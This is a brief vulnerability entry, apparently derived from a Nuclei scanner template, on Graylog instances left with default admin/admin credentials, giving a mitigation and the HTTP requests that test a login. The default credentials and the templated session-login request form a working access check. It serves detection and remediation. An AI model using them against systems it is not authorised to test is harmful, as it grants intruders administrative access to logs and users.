# Vulnerability: Graylog - Default Login
**Classification:** CWE-798
**Source:** Nuclei Template (`graylog-default-login.yaml`)

## Description
Graylog instance is accessible with default admin credentials (admin/admin). This provides full administrative access to the log management platform, including the ability to read all ingested logs, create inputs, configure pipelines, and manage users.

## Secure Mitigation
Change the default root_password_sha2 in the Graylog server.conf configuration file. Use a strong, unique password for the admin account.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /api/ HTTP/1.1
Host: {{Hostname}}
Accept: application/json

POST /api/system/sessions HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: application/json
X-Requested-By: nuclei

{"username":"{{username}}","password":"{{password}}","host":""}
```

